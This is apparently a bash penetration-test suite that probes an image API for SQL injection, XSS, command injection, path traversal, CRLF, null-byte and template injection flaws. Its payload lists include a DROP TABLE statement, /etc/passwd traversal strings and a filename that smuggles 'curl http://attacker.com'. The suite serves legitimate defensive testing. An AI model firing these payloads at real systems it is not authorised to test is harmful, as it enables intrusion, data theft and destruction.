#!/usr/bin/env bash

#
# Injection Vulnerability Test Suite
#
# Tests for injection vulnerabilities in goimg-datalayer API:
# - SQL Injection
# - XSS (Cross-Site Scripting)
# - Command Injection
# - CRLF Injection
# - Template Injection
#
# Usage: ./injection-tests.sh <BASE_URL>
# Example: ./injection-tests.sh http://localhost:8080
#
# Requirements: curl, jq
#

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
BASE_URL="${1:-http://localhost:8080}"
API_BASE="${BASE_URL}/api/v1"
OUTPUT_DIR="./pentest-results/injection"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0
CRITICAL_FINDINGS=0
HIGH_FINDINGS=0

mkdir -p "$OUTPUT_DIR"

# Logging
log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[PASS]${NC} $1"; ((TESTS_PASSED++)); }
log_fail() { echo -e "${RED}[FAIL]${NC} $1"; ((TESTS_FAILED++)); }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_critical() {
    echo -e "${RED}[CRITICAL]${NC} $1"
    echo "[$(date -Iseconds)] CRITICAL: $1" >> "$OUTPUT_DIR/critical_${TIMESTAMP}.log"
    ((CRITICAL_FINDINGS++))
}
log_high() {
    echo -e "${RED}[HIGH]${NC} $1"
    echo "[$(date -Iseconds)] HIGH: $1" >> "$OUTPUT_DIR/high_${TIMESTAMP}.log"
    ((HIGH_FINDINGS++))
}

# Setup: Create test user and get auth token
ACCESS_TOKEN=""
TEST_USER_EMAIL="injection_test_$(date +%s)@example.com"
TEST_USER_PASSWORD="TestPass123!"
TEST_IMAGE_ID=""

setup_test_auth() {
    log_info "Setting up test user and authentication"

    # Register
    curl -s -X POST "${API_BASE}/auth/register" \
        -H "Content-Type: application/json" \
        -d "{
            \"email\": \"$TEST_USER_EMAIL\",
            \"username\": \"injectiontest_$(date +%s)\",
            \"password\": \"$TEST_USER_PASSWORD\"
        }" > /dev/null

    # Login
    local response=$(curl -s -X POST "${API_BASE}/auth/login" \
        -H "Content-Type: application/json" \
        -d "{
            \"email\": \"$TEST_USER_EMAIL\",
            \"password\": \"$TEST_USER_PASSWORD\"
        }")

    ACCESS_TOKEN=$(echo "$response" | jq -r '.access_token // .tokens.access_token // empty')

    if [ -n "$ACCESS_TOKEN" ] && [ "$ACCESS_TOKEN" != "null" ]; then
        log_success "Authentication setup complete"
    else
        log_fail "Failed to obtain access token"
        exit 1
    fi
}

# ============================================================================
# SQL INJECTION TESTS
# ============================================================================

# TC-INJ-001: SQL Injection in Image Search
test_sql_injection_search() {
    log_info "TEST: TC-INJ-001 - SQL Injection in Image Search"
    ((TESTS_RUN++))

    local sql_payloads=(
        "' OR '1'='1"
        "' OR '1'='1' --"
        "' OR '1'='1' /*"
        "admin'--"
        "' OR 1=1--"
        "' UNION SELECT NULL--"
        "' UNION SELECT NULL,NULL,NULL--"
        "'; DROP TABLE images--"
        "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--"
    )

    local vulnerable=false

    for payload in "${sql_payloads[@]}"; do
        local url_encoded=$(printf %s "$payload" | jq -sRr @uri)
        local response=$(curl -s -w "\n%{http_code}" -X GET \
            "${API_BASE}/images?q=${url_encoded}" \
            -H "Authorization: Bearer $ACCESS_TOKEN")

        local status=$(echo "$response" | tail -n 1)
        local body=$(echo "$response" | head -n -1)

        # Check for SQL errors in response
        if echo "$body" | grep -Ei "sql|syntax|mysql|postgres|database|query"; then
            log_critical "SQL Injection vulnerability detected!"
            log_critical "Payload: $payload"
            log_critical "Response contains SQL error messages. CVSS: 10.0"
            vulnerable=true
            echo "$body" > "$OUTPUT_DIR/sqli_evidence_$(date +%s).txt"
            break
        fi

        # Check for unexpected success (e.g., returning all records)
        if [ "$status" = "200" ]; then
            local count=$(echo "$body" | jq '.images | length' 2>/dev/null || echo "0")
            if [ "$count" -gt 100 ]; then
                log_warn "Suspicious: payload returned $count results: $payload"
            fi
        fi
    done

    if [ "$vulnerable" = false ]; then
        log_success "No SQL injection detected in search endpoint"
    fi
}

# TC-INJ-002: SQL Injection in User Filter
test_sql_injection_user_filter() {
    log_info "TEST: TC-INJ-002 - SQL Injection in User Listing Filters"
    ((TESTS_RUN++))

    local payloads=(
        "' OR '1'='1"
        "admin' OR '1'='1"
        "' UNION SELECT password FROM users--"
    )

    for payload in "${payloads[@]}"; do
        local url_encoded=$(printf %s "$payload" | jq -sRr @uri)
        local response=$(curl -s -w "\n%{http_code}" -X GET \
            "${API_BASE}/users?search=${url_encoded}" \
            -H "Authorization: Bearer $ACCESS_TOKEN")

        local status=$(echo "$response" | tail -n 1)
        local body=$(echo "$response" | head -n -1)

        if echo "$body" | grep -Ei "sql|syntax|database|query error"; then
            log_critical "SQL Injection in user filter! Payload: $payload"
            return
        fi
    done

    log_success "No SQL injection detected in user filters"
}

# TC-INJ-003: Blind SQL Injection via Timing
test_blind_sql_injection() {
    log_info "TEST: TC-INJ-003 - Blind SQL Injection via Time Delays"
    ((TESTS_RUN++))

    # PostgreSQL-specific time delay payload
    local payload="' AND pg_sleep(5)--"
    local url_encoded=$(printf %s "$payload" | jq -sRr @uri)

    local start=$(date +%s)
    curl -s -o /dev/null -m 10 -X GET \
        "${API_BASE}/images?q=${url_encoded}" \
        -H "Authorization: Bearer $ACCESS_TOKEN" || true
    local end=$(date +%s)

    local duration=$((end - start))

    if [ $duration -ge 5 ]; then
        log_critical "Blind SQL Injection detected! Request delayed by ${duration}s"
        log_critical "Time-based SQL injection is exploitable. CVSS: 9.8"
    else
        log_success "No time-based SQL injection detected"
    fi
}

# ============================================================================
# XSS (CROSS-SITE SCRIPTING) TESTS
# ============================================================================

# TC-INJ-004: Stored XSS in Image Metadata
test_stored_xss_image_metadata() {
    log_info "TEST: TC-INJ-004 - Stored XSS in Image Metadata"
    ((TESTS_RUN++))

    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg/onload=alert('XSS')>"
        "javascript:alert('XSS')"
        "<iframe src=javascript:alert('XSS')>"
        "\"><script>alert(String.fromCharCode(88,83,83))</script>"
    )

    # Note: This test requires actual image upload
    # Create a minimal valid PNG
    local test_file="/tmp/test_xss_image_$$.png"
    # PNG header: 89 50 4E 47 0D 0A 1A 0A (magic number)
    printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > "$test_file"

    local vulnerable=false

    for payload in "${xss_payloads[@]}"; do
        # Upload image with XSS payload in title
        local response=$(curl -s -w "\n%{http_code}" -X POST \
            "${API_BASE}/images" \
            -H "Authorization: Bearer $ACCESS_TOKEN" \
            -F "image=@${test_file}" \
            -F "title=${payload}" \
            -F "description=Test image" \
            -F "visibility=private")

        local status=$(echo "$response" | tail -n 1)
        local body=$(echo "$response" | head -n -1)

        if [ "$status" = "202" ] || [ "$status" = "201" ]; then
            local image_id=$(echo "$body" | jq -r '.id // empty')

            if [ -n "$image_id" ] && [ "$image_id" != "null" ]; then
                # Retrieve image metadata
                local get_response=$(curl -s -X GET \
                    "${API_BASE}/images/${image_id}" \
                    -H "Authorization: Bearer $ACCESS_TOKEN")

                # Check if payload is returned unescaped
                if echo "$get_response" | grep -F "$payload" | grep -qv "\\<"; then
                    log_high "Stored XSS vulnerability detected!"
                    log_high "Payload stored unescaped: $payload"
                    log_high "CVSS: 8.1 (High - Stored XSS)"
                    vulnerable=true
                    break
                fi
            fi
        fi
    done

    rm -f "$test_file"

    if [ "$vulnerable" = false ]; then
        log_success "XSS payloads properly escaped in image metadata"
    fi
}

# TC-INJ-005: Reflected XSS in Error Messages
test_reflected_xss_errors() {
    log_info "TEST: TC-INJ-005 - Reflected XSS in Error Messages"
    ((TESTS_RUN++))

    local xss_in_path="<script>alert('XSS')</script>"
    local response=$(curl -s -w "\n%{http_code}" -X GET \
        "${API_BASE}/images/${xss_in_path}" \
        -H "Authorization: Bearer $ACCESS_TOKEN")

    local body=$(echo "$response" | head -n -1)

    if echo "$body" | grep -F "<script>alert('XSS')</script>"; then
        log_high "Reflected XSS in error message! Payload echoed unescaped"
        log_high "CVSS: 7.1 (High - Reflected XSS)"
    else
        log_success "XSS payload properly escaped in error messages"
    fi
}

# ============================================================================
# COMMAND INJECTION TESTS
# ============================================================================

# TC-INJ-006: Command Injection in Filename
test_command_injection_filename() {
    log_info "TEST: TC-INJ-006 - Command Injection in Filename Processing"
    ((TESTS_RUN++))

    local cmd_payloads=(
        "image.jpg; ls -la"
        "image.jpg| whoami"
        "image.jpg\`id\`"
        "image.jpg\$(whoami)"
        "image.jpg; curl http://attacker.com"
    )

    # Create test file
    local test_file="/tmp/test_cmd_injection_$$.jpg"
    printf '\xFF\xD8\xFF' > "$test_file"  # Minimal JPEG header

    for payload in "${cmd_payloads[@]}"; do
        local response=$(curl -s -w "\n%{http_code}" -X POST \
            "${API_BASE}/images" \
            -H "Authorization: Bearer $ACCESS_TOKEN" \
            -F "image=@${test_file};filename=${payload}" \
            -F "title=Command Injection Test" \
            -F "visibility=private")

        local status=$(echo "$response" | tail -n 1)
        local body=$(echo "$response" | head -n -1)

        # Check for command execution evidence in response
        if echo "$body" | grep -E "uid=|gid=|total [0-9]+|drwxr"; then
            log_critical "Command Injection detected! Payload: $payload"
            log_critical "Command output found in response. CVSS: 10.0"
            rm -f "$test_file"
            return
        fi
    done

    rm -f "$test_file"
    log_success "No command injection detected in filename processing"
}

# ============================================================================
# PATH TRAVERSAL TESTS
# ============================================================================

# TC-INJ-007: Path Traversal in File Operations
test_path_traversal() {
    log_info "TEST: TC-INJ-007 - Path Traversal in File Operations"
    ((TESTS_RUN++))

    local path_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\config\\sam"
        "....//....//....//etc/passwd"
        "..%2f..%2f..%2fetc%2fpasswd"
        "..%252f..%252f..%252fetc%252fpasswd"
    )

    local test_file="/tmp/test_path_traversal_$$.jpg"
    printf '\xFF\xD8\xFF' > "$test_file"

    for payload in "${path_payloads[@]}"; do
        local response=$(curl -s -w "\n%{http_code}" -X POST \
            "${API_BASE}/images" \
            -H "Authorization: Bearer $ACCESS_TOKEN" \
            -F "image=@${test_file};filename=${payload}" \
            -F "title=Path Traversal Test" \
            -F "visibility=private")

        local status=$(echo "$response" | tail -n 1)
        local body=$(echo "$response" | head -n -1)

        if echo "$body" | grep -E "root:x:|daemon:"; then
            log_critical "Path Traversal vulnerability! System files accessible!"
            log_critical "CVSS: 9.1 (Critical - Arbitrary File Read)"
            rm -f "$test_file"
            return
        fi
    done

    rm -f "$test_file"
    log_success "Path traversal attempts properly blocked"
}

# ============================================================================
# CRLF INJECTION TESTS
# ============================================================================

# TC-INJ-008: CRLF Injection in Headers
test_crlf_injection() {
    log_info "TEST: TC-INJ-008 - CRLF Injection in HTTP Headers"
    ((TESTS_RUN++))

    # Try to inject CRLF in User-Agent header
    local crlf_payload="Mozilla/5.0\r\nX-Injected-Header: true\r\n"

    local response=$(curl -s -i -X GET \
        "${API_BASE}/images" \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -H "User-Agent: ${crlf_payload}")

    if echo "$response" | grep "X-Injected-Header: true"; then
        log_high "CRLF Injection vulnerability detected!"
        log_high "HTTP Response Splitting possible. CVSS: 7.5 (High)"
    else
        log_success "CRLF injection properly prevented"
    fi
}

# ============================================================================
# NULL BYTE INJECTION TESTS
# ============================================================================

# TC-INJ-009: Null Byte Injection
test_null_byte_injection() {
    log_info "TEST: TC-INJ-009 - Null Byte Injection in Filenames"
    ((TESTS_RUN++))

    local test_file="/tmp/test_null_byte_$$.jpg"
    printf '\xFF\xD8\xFF' > "$test_file"

    # Filename with null byte to bypass extension validation
    local null_byte_filename="malicious.php\x00.jpg"

    local response=$(curl -s -w "\n%{http_code}" -X POST \
        "${API_BASE}/images" \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        -F "image=@${test_file};filename=${null_byte_filename}" \
        -F "title=Null Byte Test" \
        -F "visibility=private")

    local status=$(echo "$response" | tail -n 1)
    local body=$(echo "$response" | head -n -1)

    # Check if file was accepted
    if [ "$status" = "202" ] || [ "$status" = "201" ]; then
        local image_id=$(echo "$body" | jq -r '.id // empty')

        if [ -n "$image_id" ] && [ "$image_id" != "null" ]; then
            # Try to access as .php file (if stored with null byte vulnerability)
            local access_response=$(curl -s -o /dev/null -w "%{http_code}" \
                "${BASE_URL}/uploads/malicious.php")

            if [ "$access_response" != "404" ]; then
                log_critical "Null Byte Injection vulnerability!"
                log_critical "File may be accessible with .php extension. CVSS: 9.8"
                rm -f "$test_file"
                return
            fi
        fi
    fi

    rm -f "$test_file"
    log_success "Null byte injection properly prevented"
}

# ============================================================================
# TEMPLATE INJECTION TESTS
# ============================================================================

# TC-INJ-010: Server-Side Template Injection
test_template_injection() {
    log_info "TEST: TC-INJ-010 - Server-Side Template Injection"
    ((TESTS_RUN++))

    local template_payloads=(
        "{{7*7}}"
        "${7*7}"
        "<%=7*7%>"
        "\${7*7}"
        "{{config}}"
    )

    local test_file="/tmp/test_template_$$.jpg"
    printf '\xFF\xD8\xFF' > "$test_file"

    for payload in "${template_payloads[@]}"; do
        local response=$(curl -s -X POST \
            "${API_BASE}/images" \
            -H "Authorization: Bearer $ACCESS_TOKEN" \
            -F "image=@${test_file}" \
            -F "title=${payload}" \
            -F "visibility=private")

        local image_id=$(echo "$response" | jq -r '.id // empty')

        if [ -n "$image_id" ] && [ "$image_id" != "null" ]; then
            local get_response=$(curl -s -X GET \
                "${API_BASE}/images/${image_id}" \
                -H "Authorization: Bearer $ACCESS_TOKEN")

            # Check if template was evaluated (7*7=49)
            if echo "$get_response" | grep -q "49"; then
                log_critical "Template Injection vulnerability detected!"
                log_critical "Payload: $payload evaluated to 49. CVSS: 9.8"
                rm -f "$test_file"
                return
            fi
        fi
    done

    rm -f "$test_file"
    log_success "No template injection detected"
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

main() {
    echo "=========================================="
    echo "  Injection Vulnerability Test Suite"
    echo "  Target: $BASE_URL"
    echo "  Timestamp: $TIMESTAMP"
    echo "=========================================="
    echo

    # Check dependencies
    for cmd in curl jq; do
        if ! command -v $cmd &> /dev/null; then
            echo "ERROR: Required command '$cmd' not found"
            exit 1
        fi
    done

    # Setup
    setup_test_auth

    echo
    echo "Running injection vulnerability tests..."
    echo

    # SQL Injection Tests
    test_sql_injection_search
    test_sql_injection_user_filter
    test_blind_sql_injection

    # XSS Tests
    test_stored_xss_image_metadata
    test_reflected_xss_errors

    # Command Injection Tests
    test_command_injection_filename

    # Path Traversal Tests
    test_path_traversal

    # Other Injection Tests
    test_crlf_injection
    test_null_byte_injection
    test_template_injection

    # Summary
    echo
    echo "=========================================="
    echo "  Test Summary"
    echo "=========================================="
    echo "Tests Run:         $TESTS_RUN"
    echo "Tests Passed:      $TESTS_PASSED"
    echo "Tests Failed:      $TESTS_FAILED"
    echo "Critical Findings: $CRITICAL_FINDINGS"
    echo "High Findings:     $HIGH_FINDINGS"
    echo
    echo "Results saved to: $OUTPUT_DIR"
    echo "=========================================="

    if [ $CRITICAL_FINDINGS -gt 0 ]; then
        echo
        echo "⚠️  CRITICAL VULNERABILITIES FOUND - LAUNCH BLOCKER"
        exit 1
    elif [ $HIGH_FINDINGS -gt 0 ]; then
        echo
        echo "⚠️  HIGH SEVERITY VULNERABILITIES FOUND"
        exit 1
    fi

    exit 0
}

main
